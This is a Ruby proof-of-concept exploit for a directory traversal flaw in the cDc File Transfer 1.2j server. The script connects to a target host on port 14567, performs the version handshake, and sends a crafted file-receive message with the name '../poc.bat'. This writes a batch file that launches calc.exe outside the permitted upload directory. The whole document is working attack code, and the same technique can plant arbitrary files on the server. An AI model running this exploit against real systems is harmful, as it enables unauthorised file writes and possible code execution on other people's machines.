#!/usr/bin/env ruby
# cDc File Transfer 1.2j Server Traversal
#
# allows to have files upload outside of the default directory

require 'rex'
require 'socket'

host = ARGV[0]

def usage
 puts "cDc File Transfer 1.2j Server Traversal"
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

content = "calc.exe"

name = "poc.bat"

raw = "#FILERECV ../#{name} #{content.size} 32 0" + "\x00"
raw_size = [raw.size].pack('c')

line = "\x04" + raw_size + raw 

data = "\x03" + content.size.chr + content

begin
sock = TCPSocket.new(host,14567)
res = sock.recv(5)
sock.write("1.2j")
sock.write([0x00000000].pack('V'))
sock.write(line)
sock.write(data)
res = sock.recv(13)
#puts res
rescue => e
puts "[!] #{e.to_s}"
end

